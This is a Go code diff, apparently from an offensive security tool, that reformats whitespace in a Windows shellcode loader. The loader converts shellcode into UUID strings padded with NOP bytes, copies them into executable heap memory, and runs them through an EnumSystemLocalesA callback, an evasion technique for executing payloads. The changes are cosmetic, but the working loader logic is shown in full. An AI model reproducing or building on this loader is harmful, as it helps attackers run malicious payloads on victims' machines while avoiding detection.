@@ -25,7 +25,7 @@ func UuidFromStringA(shellcode []byte) (error) {
 	heapAddr, _, err := heapCreate.Call(0x00040000, 0, 0)
 	if heapAddr == 0 {
 		return err
-  }
+	}
 
 	addr, _, err := heapAlloc.Call(heapAddr, 0, 0x00100000)
 	if addr == 0 {
@@ -45,16 +45,16 @@ func UuidFromStringA(shellcode []byte) (error) {
 
 	ret, _, err := enumSystemLocalesA.Call(addr, 0)
 	if ret == 0 {
-    return err
+		return err
 	}
-  return nil
+	return nil
 }
 
 func shellcodeToUUID(shellcode []byte) ([]string, error) {
-  if 16-len(shellcode)%16 < 16 {
-    pad := bytes.Repeat([]byte{byte(0x90)}, 16-len(shellcode)%16)
-    shellcode = append(shellcode, pad...)
-  }
+	if 16-len(shellcode)%16 < 16 {
+		pad := bytes.Repeat([]byte{byte(0x90)}, 16-len(shellcode)%16)
+		shellcode = append(shellcode, pad...)
+  	}
 
 	var uuids []string
 	for i := 0; i < len(shellcode); i += 16 {
@@ -75,13 +75,14 @@ func shellcodeToUUID(shellcode []byte) ([]string, error) {
 		uuidBytes = append(uuidBytes, shellcode[i+8:i+16]...)
 
 		u, err := uuid.FromBytes(uuidBytes)
-    if err != nil {
-      return nil, fmt.Errorf("there was an error converting bytes into a UUID:\n%s", err)
-    }
+		if err != nil {
+			return nil, fmt.Errorf("there was an error converting bytes into a UUID:\n%s", err)
+		}
 
-    uuids = append(uuids, u.String())
-  }
-  return uuids, nil
+		uuids = append(uuids, u.String())
+	}
+	
+	return uuids, nil
 }
 
 
